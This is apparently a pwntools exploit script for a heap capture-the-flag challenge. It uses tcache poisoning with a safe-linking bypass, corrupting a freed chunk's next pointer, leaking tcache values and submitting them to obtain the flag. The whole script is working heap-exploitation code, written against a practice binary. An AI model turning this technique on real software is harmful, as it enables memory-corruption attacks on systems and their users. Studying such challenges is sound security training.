#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('/challenge/seeking-safe-secrets-easy', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000401EE4
            b* 0x0000000000402021
            b* 0x0000000000402184
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

PROMPT = b"[*] Function (malloc/free/puts/scanf/send_flag/quit): "

def sla(aft, data):
    p.sendlineafter(aft, data)

def _malloc(idx, size):
    sla(PROMPT, b"malloc")
    sla(b"Index: ", str(idx).encode())
    sla(b"Size: ", str(size).encode())

def _free(idx):
    sla(PROMPT, b"free")
    sla(b"Index: ", str(idx).encode())

def _puts(idx):
    sla(PROMPT, b"puts")
    sla(b"Index: ", str(idx).encode())

def _scanf(idx, data):
    sla(PROMPT, b"scanf")
    sla(b"Index: ", str(idx).encode())
    p.sendline(data)

def send_flag(data):
    p.sendline(b"send_flag")
    sla(b"Secret: ", data)

def leak_next_key_from_tcache_output(p, target_addr):
    data = p.recvuntil(PROMPT, drop=False)

    pattern = (
        rb"\|\s*" + hex(target_addr).encode() +
        rb"\s*\|[^|]*\|[^|]*\|\s*"
        rb"(0x[0-9a-fA-F]+)\s*\|\s*"
        rb"(0x[0-9a-fA-F]+)\s*\|"
    )

    m = re.search(pattern, data)
    next_val = int(m.group(1), 16)
    key_val  = int(m.group(2), 16)

    log.success(f"next = {hex(next_val)}")
    log.success(f"key  = {hex(key_val)}")

    leaked = p64(next_val) + p64(key_val)
    log.success(f"raw leak = {leaked!r}")

    return next_val, key_val, leaked

p.recvuntil('In this challenge, there is a secret stored at ')
secret = int(p.recvuntil(b'.', drop = True), 16)
log.info("secret: " + hex(secret))

_malloc(0, 0x40)
_malloc(1, 0x40)
p.recvuntil(b'[*] allocations[1] = malloc(64)\n')
p.recvuntil(b'allocations[1] = ')
chunk1 = int(p.recvline()[:-1], 16)
log.info("chunk1: " + hex(chunk1))
_free(0)
_free(1)

_scanf(1, p64(secret ^ (chunk1 >> 12)))

# GDB()
_malloc(2, 0x40)

_next, _key, _leak = leak_next_key_from_tcache_output(p, secret)

send_flag(_leak)

p.interactive()


